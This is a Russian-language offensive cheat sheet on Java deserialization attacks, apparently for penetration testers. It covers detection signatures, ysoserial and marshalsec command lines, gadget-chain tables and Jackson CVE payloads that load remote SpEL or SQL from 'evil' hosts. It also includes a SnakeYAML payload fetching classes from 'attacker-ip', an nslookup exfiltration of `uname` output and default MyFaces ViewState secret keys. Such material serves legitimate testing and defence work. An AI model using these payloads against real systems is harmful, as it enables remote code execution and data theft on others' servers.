* [Обнаружение](#Обнаружение)
* [Инструменты](#Инструменты)
  * [Ysoserial](#Ysoserial)
  * [Расширения Burp с использованием ysoserial](#Расширения-Burp-с-использованием-ysoserial)
  * [Альтернативные инструменты](#Альтернативные-инструменты)
* [Десериализация YAML](#Десериализация-YAML)
* [ViewState](#ViewState)
* [Ссылки](#URL)

# Десериализация Java

> Сериализация Java — это процесс преобразования состояния объекта Java в поток байтов, который можно сохранить или передать, а затем восстановить (десериализовать) обратно в исходный объект.
>> Сериализация в Java в основном выполняется с помощью интерфейса Serializable, который помечает класс как сериализуемый, что позволяет сохранять его в файлы, отправлять по сети или передавать между виртуальными машинами Java.

# Обнаружение

* "AC ED 00 05" в шестнадцатеричном формате
  * AC ED: STREAM_MAGIC. Указывает, что это протокол сериализации.
  * 00 05: STREAM_VERSION. Версия сериализации.
* "rO0" в Base64
* Content-Type = "application/x-java-serialized-object"
* "H4sIAAAAAAAAAJ" в gzip(base64)

# Инструменты

## **Ysoserial**

[frohoff/ysoserial](https://github.com/frohoff/ysoserial): инструмент для экспериментальной генерации полезных данных, использующих небезопасную десериализацию объектов Java.

```
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[удалено]' | gzip | base64

java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
     -jar ysoserial.jar CommonsCollections4 "command"
```
| Ситуация | Рекомендуемые payload | Примечания |
|----------|---------------------|------------|
| Неизвестная среда | URLDNS, CommonsBeanutils1 | Начать с теста |
| Commons Collections 3.x | CommonsCollections1, 5, 6, 7 | Самые стабильные |
| Commons Collections 4.x | CommonsCollections2, 4 | Для версии 4.0 |
| Spring приложение | Spring1, Spring2 | Требует Spring в classpath |
| Java 7 | Jdk7u21 | Специфичный для Java 7 |
| Ограниченная среда | Clojure, Groovy1 | Если есть соответствующие библиотеки |
| Modern Java | CommonsCollections4 с --add-opens | Java 11+ |

* URLDNS - запускает поиск DNS для предоставленного URL. Самое главное, она не полагается на целевое приложение, использующее определенную уязвимую библиотеку, и работает в любой известной версии Java. Это делает ее наиболее универсальной цепочкой гаджетов для целей обнаружения.
> Если обнаружить сериализованный объект в трафике, можно попробовать использовать эту цепочку для создания объекта, который запускает взаимодействие DNS с сервером Burp Collaborator. 

* JRMPClient — можно использовать для первоначального обнаружения.
> заставляет сервер попытаться установить TCP-соединение с предоставленным IP-адресом.(нужно указать необработанный IP-адрес, а не имя хоста.) 
>> может быть полезна в средах, где весь исходящий трафик защищен брандмауэром, включая поиск DNS.
>>> сгенерировать полезные данные с двумя разными IP-адресами: локальным и внешним, защищенным брандмауэром.
>>> Если приложение немедленно отвечает на полезные данные с локальным адресом, но зависает на полезных данных с внешним адресом, это означает, что цепочка сработала, потому что сервер пытался подключиться к защищенному брандмауэром адресу.(помогает определить, происходит ли десериализация в слепых случаях.)

**Список полезных данных, включённых в ysoserial**

| Нагрузка | Автор | Зависимости |
|----------|-------|-------------|
| AspectJWeaver | @Jang | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| BeanShell1 | @pwntester, @cschneider4711 | bsh:2.0b5 |
| C3P0 | @mbechler | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| Click1 | @artsploit | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| Clojure | @JackOfMostTrades | clojure:1.8.0 |
| CommonsBeanutils1 | @frohoff | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| CommonsCollections1 | @frohoff | commons-collections:3.1 |
| CommonsCollections2 | @frohoff | commons-collections4:4.0 |
| CommonsCollections3 | @frohoff | commons-collections:3.1 |
| CommonsCollections4 | @frohoff | commons-collections4:4.0 |
| CommonsCollections5 | @matthias_kaiser, @jasinner | commons-collections:3.1 |
| CommonsCollections6 | @matthias_kaiser | commons-collections:3.1 |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1 |
| FileUpload1 | @mbechler | commons-fileupload:1.3.1, commons-io:2.4 |
| Groovy1 | @frohoff | groovy:2.3.9 |
| Hibernate1 | @mbechler |  |
| Hibernate2 | @mbechler |  |
| JBossInterceptors1 | @matthias_kaiser | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| JRMPClient | @mbechler |  |
| JRMPListener | @mbechler |  |
| JSON1 | @mbechler | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1 | @matthias_kaiser | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| Jdk7u21 | @frohoff |  |
| Jython1 | @pwntester, @cschneider4711 | jython-standalone:2.5.2 |
| MozillaRhino1 | @matthias_kaiser | js:1.7R2 |
| MozillaRhino2 | @_tint0 | js:1.7R2 |
| Myfaces1 | @mbechler |  |
| Myfaces2 | @mbechler |  |
| ROME | @mbechler | rome:1.0 |
| Spring1 | @frohoff | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
| Spring2 | @mbechler | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
| URLDNS | @gebl |  |
| Vaadin1 | @kai_ullrich | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| Wicket1 | @jacob-baines | wicket-util:6.23.0, slf4j-api:1.6.4 |

## Расширения Burp

* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) — расширение Burp для проведения атак десериализации Java
* [federicodotta/scaner](https://github.com/federicodotta/Java-Deserialization-Scanner) — универсальный плагин для Burp Suite для обнаружения и эксплуатации уязвимостей десериализации Java
* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) — интеграция YSOSERIAL с Burp Suite
* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) — выявление уязвимостей десериализации Java в Burp
* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) — расширение Burp для активного выявления уязвимостей десериализации Java

## Альтернативные инструменты

* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) — гаджет для десериализации JRE 8 RCE
* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) — проверка и эксплуатация JBoss (и других уязвимостей десериализации Java) Инструмент
* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) — форк оригинального приложения ysoserial
* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) — инструмент для атаки методом подбора паролей на Java-сериализацию
* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) — инструмент для вывода потоков сериализации Java в более удобном для восприятия виде
* [bishopfox/gadgetprobe](https://bishopfox.com/tools/gadgetprobe) — использование десериализации для подбора паролей к удалённому классу
* [k3idii/Deserek](https://github.com/k3idii/Deserek) — код на Python для сериализации и десериализации двоичного формата сериализации Java.
  
```
java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
python deserek.py yss_base.bin --format python > yss_url.py
python yss_url.py yss_new.bin
java -cp JavaSerializationTestSuite DeSerial yss_new.bin
```

* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Превращение данных в выполнение кода

```
$ java -cp marshalsec.jar marshalsec.<маршаллер> [-a] [-v] [-t] [<тип_гаджета> [<аргументы...>]]
$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
// -a — генерирует/тестирует все полезные данные для данного маршаллера
// -t — запускается в тестовом режиме, демаршаллируя сгенерированные полезные данные после их генерации.
// -v — подробный режим, например, также отображает сгенерированную полезную нагрузку в тестовом режиме.
// gadget_type — идентификатор конкретного гаджета. Если не указан, будут отображаться доступные для данного маршаллера.
// arguments — аргументы, специфичные для гаджета
```

**генераторы полезных нагрузок (payloads) для различных библиотек сериализации в Java**

| Библиотеки          | Воздействие гаджетов                                                          |
|--------------------|-------------------------------------------------------------------------------|
| BlazeDSAMF(0\|3\|X) | Эскалация до Java сериализации, различные RCE через сторонние библиотеки      |
| Hessian\|Burlap    | Различные RCE через сторонние библиотеки                                      |
| Castor             | RCE через зависимости библиотек                                               |
| Jackson            | Возможный RCE для эксплуатации достаточно стандартных библиотек Java, различные RCE через сторонние библиотеки |
| Java               | Еще один RCE через сторонние библиотеки                                       |
| JsonIO             | RCE для эксплуатации достаточно стандартных библиотек Java                    |
| JYAML              | RCE для эксплуатации достаточно стандартных библиотек Java                    |
| Kryo               | RCE через сторонние библиотеки                                                |
| KryoAltStrategy    | RCE для эксплуатации достаточно стандартных библиотек Java                    |
| Red5AMF(0\|3)      | RCE для эксплуатации достаточно стандартных библиотек Java                    |
| SnakeYAML          | RCE для эксплуатации достаточно стандартных библиотек Java                    |
| XStream            | RCE для эксплуатации достаточно стандартных библиотек Java                    |
| YAMLBeans          | RCE через сторонние библиотеки                                                |


# Десериализация JSON

Для работы с JSON в Java можно использовать множество библиотек.

* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)

* **Jackson**

> Jackson — популярная библиотека Java для работы с данными JSON (JavaScript Object Notation). 
>
>Jackson-databind поддерживает полиморфную обработку типов (PTH), ранее известную как «полиморфная десериализация», которая по умолчанию отключена.
>> Полиморфная десериализация позволяет указать произвольный тип объекта, который будет создан при десериализации, даже если этот тип не ожидался приложением.

* Чтобы определить, использует ли бэкенд Jackson, наиболее распространённым способом является отправка недопустимого JSON-кода и проверка сообщения об ошибке. 

Любой из следующих вариантов:

* Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
  * com.fasterxml.jackson.databind
  * org.codehaus.jackson.map


**Эксплуатация**

  * CVE-2017-7525
```json
{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": [
        "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
      ],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
}
```
  * CVE-2017-17485
```json
{
  "param": [
    "org.springframework.context.support.FileSystemXmlApplicationContext",
    "http://evil/spel.xml"
  ]
}
```
  * CVE-2019-12384
```json
[
  "ch.qos.logback.core.db.DriverManagerConnectionSource", 
  {
    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
  }
]
```
  * CVE-2020-36180
```json
[
  "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
  {
    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
  }
]
```
CVE-2020-9548
```json
[
  "br.com.anteros.dbcp.AnterosDBCPConfig",
  {
    "healthCheckRegistry": "ldap://{{interactsh-url}}"
  }
]
```

# Десериализация YAML

* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)

**SnakeYAML**

> SnakeYAML — популярная библиотека на основе Java, используемая для анализа и вывода данных в формате YAML (YAML не является языком разметки).
>> Она предоставляет простой в использовании API для работы с YAML — стандартом сериализации данных, понятным человеку, который обычно используется для файлов конфигурации и обмена данными.

```yaml
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://attacker-ip/"]
]]
]
```

# ViewState

> В Java ViewState — это механизм, используемый такими фреймворками, как JavaServer Faces (JSF), для поддержания состояния компонентов пользовательского интерфейса между HTTP-запросами в веб-приложениях.

* Существует две основные реализации:
  * **Oracle Mojarra** (эталонная реализация JSF)
  * **Apache MyFaces**

* **Инструменты**
  * [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) — JexBoss: инструмент проверки и эксплуатации уязвимостей Jboss (и Java Deserialization Vulnerabilities)
  * [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) — InYourFace — это программное обеспечение для исправления незашифрованных и неподписанных ViewState в JSF.

|Кодировка|Кодировка начинается с|
|------|--------|
|base64 | rO0 |
|base64 + gzip |H4sIAAA|

**Хранилище**

> javax.faces.STATE_SAVING_METHOD — это параметр конфигурации в JavaServer Faces (JSF). Он определяет, как фреймворк должен сохранять состояние дерева компонентов (структуру и данные компонентов пользовательского интерфейса на странице) между HTTP-запросами.

Метод хранения также можно определить из представления viewstate в теле HTML.

* Хранилище на стороне сервера: ```value="-XXX:-XXXX"```
* Хранилище на стороне клиента: ```base64 + gzip + Java Object```

**Шифрование**

По умолчанию MyFaces использует DES в качестве алгоритма шифрования и HMAC-SHA1 для аутентификации ViewState. Рекомендуется и возможно использовать более современные алгоритмы, такие как AES и HMAC-SHA256.
|Алгоритм шифрования| HMAC|
|----|----|
|DES ECB (по умолчанию)| HMAC-SHA1|

Поддерживаемые методы шифрования: BlowFish, 3DES, AES, определяются параметром контекста. Значения этих параметров и их секретные ключи можно найти внутри XML-выражений.

```
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
<param-name>org.apache.myfaces.SECRET</param-name>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

Распространённые секреты из [документации](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).

| Алгоритм            | Значение                          |
|-------------------|---------------------------------|
| AES CBC/PKCS5Padding | NzY1NDMyMTA3NjU0MzIxMA==       |
| DES               | NzY1NDMyMTA=                    |
| DESede            | MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz |
| Blowfish          | NzY1NDMyMTA3NjU0MzIxMA          |
| AES CBC           | MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz |
| AES CBC IV        | NzY1NDMyMTA3NjU0MzIxMA==        |

* Encryption: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
* Decryption: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data


# URL

* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
* https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/
